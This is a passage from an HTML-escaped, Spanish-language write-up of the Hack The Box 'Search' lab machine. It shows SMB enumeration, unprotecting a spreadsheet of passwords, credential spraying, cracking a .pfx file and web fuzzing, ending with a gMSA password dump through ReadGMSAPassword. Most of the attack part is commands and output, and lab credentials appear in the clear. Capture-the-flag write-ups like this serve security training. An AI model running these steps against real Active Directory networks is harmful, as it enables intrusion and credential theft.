        .&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;edirectedFolders&lt;span class=&quot;nv&quot;&gt;$edgar&lt;/span&gt;.jacobs&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dw--w--w--                0 Mon Aug 10 12:02:16 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dw--w--w--                0 Mon Aug 10 12:02:16 2020    ..
        dr--r--r--                0 Thu Apr  9 22:05:29 2020    &lt;span class=&quot;nv&quot;&gt;$RECYCLE&lt;/span&gt;.BIN
        fr--r--r--              282 Mon Aug 10 12:02:16 2020    desktop.ini
        fr--r--r--             1450 Thu Apr  9 22:05:03 2020    Microsoft Edge.lnk
        fr--r--r--            23130 Mon Aug 10 12:30:05 2020   &lt;span class=&quot;s2&quot;&gt;&quot; Phishing_Attempt.xlsx&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Encontramos un recurso nuevo que nos traemos a nuestra maquina atacante&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;edgar.jacobs&apos; -p &apos;@3ONEmillionbaby&apos; -H 10.10.11.129 --download &apos;RedirectedFolders$/edgar.jacobs/Desktop/Phishing_Attempt.xlsx&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting download: RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;edgar.jacobs&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;esktop&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;hishing_Attempt.xlsx &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;23130 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File output to: /home/pro/Escritorio/HTB/Search/content/10.10.11.129-RedirectedFolders_edgar.jacobs_Desktop_Phishing_Attempt.xlsx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a movernos el archivo a una carpeta vacia y abrirlo, al abrirlo vemos que falta una Columna ‘C’ y procedemos a realizar un ‘unzip’ para Bypassear las Restricciones del Excell&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; Procedimiento a Seguir :
 unzip Phishing_Attempt.xlsx
 sed-i&lt;span class=&quot;s1&quot;&gt;&apos;s/&amp;lt;sheetProtection[^&amp;gt;]*&amp;gt;//&apos;&lt;/span&gt; xl/worksheets/sheet2.xml
 zip &lt;span class=&quot;nt&quot;&gt;-fr&lt;/span&gt; Phishing_Attempt.xlsx &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ls    &lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&apos;[Content_Types].xml&apos;&lt;/span&gt;   docProps   Phishing_Attempt.xlsx   _rels   xl                                                                                                                                                   

&lt;span class=&quot;c&quot;&gt;# Procedemos a modificar el archivo sheet2.xml para quitar la &amp;lt;sheetProtection&amp;gt; y volver a zipear el archivo quitando la proteccion&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# zip -fr Phishing_Attempt.xlsx *&lt;/span&gt;
freshening: xl/worksheets/sheet2.xml &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;deflated 73%&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# ls&lt;/span&gt;
&lt;span class=&quot;s1&quot;&gt;&apos;[Content_Types].xml&apos;&lt;/span&gt;   docProps   Phishing_Attempt.xlsx   _rels   xl

&lt;span class=&quot;c&quot;&gt;# wps Phishing_Attempt.xlsx &lt;/span&gt;

Firstname	lastname	password	                        Username
Payton	Harmon	        &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;36!cried!INDIA!year!50&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;	        Payton.Harmon
Cortez	Hickman	        ..10-time-TALK-proud-66..	        Cortez.Hickman
Bobby	Wolf	        ??47^before^WORLD^surprise^91??	    Bobby.Wolf
Margaret Robinson	    //51+mountain+DEAR+noise+83//	    Margaret.Robinson
Scarlett Parks	        ++47|building|WARSAW|gave|60++	    Scarlett.Parks
Eliezer	Jordan	        &lt;span class=&quot;o&quot;&gt;!!&lt;/span&gt;05_goes_SEVEN_offer_83!!	        Eliezer.Jordan
Hunter Kirby	        ~~27%when%VILLAGE%full%00~~	        Hunter.Kirby
Sierra Frye	            &lt;span class=&quot;nv&quot;&gt;$$49&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;wide&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;STRAIGHT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;jordan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;28&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;18	Sierra.Frye
Annabelle Wells	        &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;95~pass~QUIET~austria~77&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;	    Annabelle.Wells
Eve	Galvan	            //61!banker!FANCY!measure!25//	    Eve.Galvan
Jeramiah Fritz	        ??40:student:MAYOR:been:66??	    Jeramiah.Fritz
Abby Gonzalez	        &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt;75:major:RADIO:state:93&amp;amp;&amp;amp;	        Abby.Gonzalez
Joy	Costa	            &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;30&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;venus&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;BALL&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;office&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;42&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;	        Joy.Costa
Vincent	Sutton	        &lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;24&amp;amp;moment&amp;amp;BRAZIL&amp;amp;members&amp;amp;66&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;	    Vincent.Sutton
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a probar las contraseñas encontradas para los usuarios encontrados&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# crackmapexec smb 10.10.11.129 -u sierra.frye -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos;                                                                        &lt;/span&gt;
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:RESEARCH&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:search.htb&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
SMB         10.10.11.129    445    RESEARCH         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] search.htb&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;ierra.frye:&lt;span class=&quot;nv&quot;&gt;$$49&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;wide&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;STRAIGHT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;jordan&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;28&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;18 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a comprobar los Recursos de SMB para este usuario.&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$/sierra.frye&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        .&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;edirectedFolders&lt;span class=&quot;nv&quot;&gt;$sierra&lt;/span&gt;.frye&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dr--r--r--                0 Thu Nov 18 02:01:45 2021    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Thu Nov 18 02:01:45 2021    ..
        dw--w--w--                0 Thu Nov 18 02:08:17 2021    Desktop
        dw--w--w--                0 Fri Jul 31 16:42:19 2020    Documents
        dw--w--w--                0 Fri Jul 31 16:45:36 2020    Downloads
        fr--r--r--               33 Thu Nov 18 02:01:45 2021    &lt;span class=&quot;s2&quot;&gt;&quot;user.txt&quot;&lt;/span&gt;
                                                                                                                                                                                                                                                 
&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 --download &apos;RedirectedFolders$/sierra.frye/user.txt&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting download: RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;sierra.frye&lt;span class=&quot;se&quot;&gt;\u&lt;/span&gt;ser.txt &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;33 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File output to: /home/pro/Escritorio/HTB/Search/content/10.10.11.129-RedirectedFolders_sierra.frye_user.txt

&lt;span class=&quot;c&quot;&gt;# cat user.txt                                                                      &lt;/span&gt;
39d6dde72c8e6b2a0d4exxxxxxxxxxxxxxxxx
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Enumeramos un poco mas ..&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$/sierra.frye/Downloads&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        .&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;edirectedFolders&lt;span class=&quot;nv&quot;&gt;$sierra&lt;/span&gt;.frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dw--w--w--                0 Fri Jul 31 16:45:36 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dw--w--w--                0 Fri Jul 31 16:45:36 2020    ..
        dr--r--r--                0 Thu Jul 30 19:25:57 2020    &lt;span class=&quot;nv&quot;&gt;$RECYCLE&lt;/span&gt;.BIN
        dr--r--r--                0 Mon Aug 10 22:39:17 2020    Backups
        fr--r--r--              282 Fri Jul 31 16:42:18 2020    desktop.ini

&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 -r &apos;RedirectedFolders$/sierra.frye/Downloads/Backups&apos; &lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] IP: 10.10.11.129:445        Name: search.htb                                        
        Disk                                                    Permissions     Comment
        &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                                                    &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;     &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;                                     READ, WRITE
        .&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;edirectedFolders&lt;span class=&quot;nv&quot;&gt;$sierra&lt;/span&gt;.frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&lt;span class=&quot;se&quot;&gt;\B&lt;/span&gt;ackups&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;
        dr--r--r--                0 Mon Aug 10 22:39:17 2020    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
        dr--r--r--                0 Mon Aug 10 22:39:17 2020    ..
        fr--r--r--             2643 Fri Jul 31 17:04:11 2020    search-RESEARCH-CA.p12
        fr--r--r--             4326 Mon Aug 10 22:39:17 2020    staff.pfx

&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 --download &apos;RedirectedFolders$/sierra.frye/Downloads/Backups/staff.pfx&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting download: RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;sierra.frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&lt;span class=&quot;se&quot;&gt;\B&lt;/span&gt;ackups&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;taff.pfx &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4326 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File output to: /home/pro/Escritorio/HTB/Search/content/10.10.11.129-RedirectedFolders_sierra.frye_Downloads_Backups_staff.pfx

&lt;span class=&quot;c&quot;&gt;# smbmap -u &apos;sierra.frye&apos; -p &apos;$$49=wide=STRAIGHT=jordan=28$$18&apos; -H 10.10.11.129 --download &apos;RedirectedFolders$/sierra.frye/Downloads/Backups/search-RESEARCH-CA.p12&apos;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Starting download: RedirectedFolders&lt;span class=&quot;nv&quot;&gt;$\&lt;/span&gt;sierra.frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&lt;span class=&quot;se&quot;&gt;\B&lt;/span&gt;ackups&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;earch-RESEARCH-CA.p12 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2643 bytes&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] File output to: /home/pro/Escritorio/HTB/Search/content/10.10.11.129-RedirectedFolders_sierra.frye_Downloads_Backups_search-RESEARCH-CA.p12
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez descargados los dos archivos vemos que estamos ante un archivo .pfx (el cual podemos crackear) y un certificado que podemos importar en Firefox para acceder a algun recurso..&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# pfx2john staff.pfx &amp;gt; hash_pfx&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# # john  hash_pfx --show   &lt;/span&gt;
staff.pfx:misspissy:::::staff.pfx

1 password &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;cracked, 0 left
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Procedemos a hacer fuzzing en la pagina web&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# wfuzz -c --hc=404 -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.11.129/FUZZ&lt;/span&gt;

Target: http://10.10.11.129/FUZZ
Total requests: 220548

&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                         
&lt;span class=&quot;o&quot;&gt;=====================================================================&lt;/span&gt;

000000232:   403        29 L     92 W       1233 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;staff&quot;&lt;/span&gt; 
000000003:   301        1 L      10 W       150 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;images&quot;&lt;/span&gt; 
000000190:   301        1 L      10 W       150 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;Images&quot;&lt;/span&gt;    
000000537:   301        1 L      10 W       147 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;css&quot;&lt;/span&gt;     
000000940:   301        1 L      10 W       146 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;js&quot;&lt;/span&gt;        
000002601:   403        29 L     92 W       1233 Ch     &lt;span class=&quot;s2&quot;&gt;&quot;Staff&quot;&lt;/span&gt;     
000002758:   301        1 L      10 W       149 Ch      &lt;span class=&quot;s2&quot;&gt;&quot;fonts&quot;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Probando la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;staff&quot;&lt;/code&gt; vemos que se nos pide un certificado, procedemos a subir el CA.p12 que nos hemos descargado y nos pide una contraseña introducimos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;misspissy&lt;/code&gt; la passwd obtenida para el archivo .pfx&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Accedemos a un panel &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://10.10.11.129/staff/en-US/logon.aspx?ReturnUrl=%2fstaff%2f&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Nos Logueamos con el user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sierra.frye&lt;/code&gt; y su pass, machine name –&amp;gt; Research&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Obtenemos una consola interactiva &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;https://10.10.11.129/staff/en-US/console.aspx&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Obtenida la Flag de user.txt procedemos inicializar Neo4j y a enumerar con BloodHound, para ver como podriamos llegar a ser administradores del Dominio.&lt;/p&gt;

&lt;p&gt;Como ya poseemos credenciales validas podemos usar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BloodHound.py&lt;/code&gt; para recolectar informacion del sistema.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# python3 /opt/BloodHound.py/bloodhound.py -u hope.sharp -p &quot;IsolationIsKey?&quot; -d search.htb -ns 10.10.11.129 --zip&lt;/span&gt;
20220606130949_bloodhound.zip
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cargamos el .zip en BloodHound –&amp;gt; y marcamos los usuarios que ya tenemos como Owned o Pwned
Procedemos a irnos a Shortest Paths y desde el usuario Sierra Frye pinchamos en Shortest Parth from Owned Principals&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Sierra.Frye Pertenece a &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Group: Birmingham-itsec@search.htb &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Group: ITSECT@search.htb &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;ReadGMSAPassword&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; user: BIR-ADFS-GMSA@SEARCH.HTB
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Abusando de  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ReadGMSAPassword&lt;/code&gt; :&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;AD &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; ReadGMSAPassword Powershell
Procedemos de la siguiente forma:
Get-ADServiceAccount 

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 

Get-ADServiceAccount &lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;BIR-ADFS-GMSA&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Properties&lt;/span&gt; msds-ManagedPassword

 

DistinguishedName    : &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;BIR-ADFS-GMSA,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Managed Service Accounts,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;search,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
Enabled              : True
msds-ManagedPassword : &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;1, 0, 0, 0...&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
Name                 : BIR-ADFS-GMSA
ObjectClass          : msDS-GroupManagedServiceAccount
ObjectGUID           : 48cd6c5b-56cb-407e-ac2b-7294b5a44857
SamAccountName       : BIR-ADFS-GMSA&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
SID                  : S-1-5-21-271492789-1610487937-1871574529-1299
UserPrincipalName    : 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;– Sacando la Credencial en formato NT Hash–&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$pwd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-ADServiceAccount &lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;BIR-ADFS-GMSA&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Properties&lt;/span&gt; msds-ManagedPassword

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ConvertFrom-ADManagedPasswordBlob &lt;span class=&quot;nv&quot;&gt;$pwd&lt;/span&gt;.’msds-managedpassword’

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
ConvertTo-NTHash &lt;span class=&quot;nv&quot;&gt;$pw&lt;/span&gt;.securecurrentpassword
e1e9fd9e46d0d747e1595167eedcec0f
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;– Sacando la Credencial –&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$gmsa&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; Get-ADServiceAccount &lt;span class=&quot;nt&quot;&gt;-Identity&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;BIR-ADFS-GMSA&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Properties&lt;/span&gt; msDS-ManagedPassword

PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
&lt;span class=&quot;nv&quot;&gt;$mp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$gmsa&lt;/span&gt;.&lt;span class=&quot;s1&quot;&gt;&apos;msDS-ManagedPassword&apos;&lt;/span&gt;


PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\S&lt;/span&gt;ierra.Frye&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; 
ConvertFrom-ADManagedPasswordBlob &lt;span class=&quot;nv&quot;&gt;$mp&lt;/span&gt;

Version                   : 1

CurrentPassword           : ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾ롤
                            ᒛ�䬁ማ譿녓鏶骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱茾蒚⟒澽座걍盡篇

SecureCurrentPassword     : System.Security.SecureString
PreviousPassword          : 
SecurePreviousPassword    : 
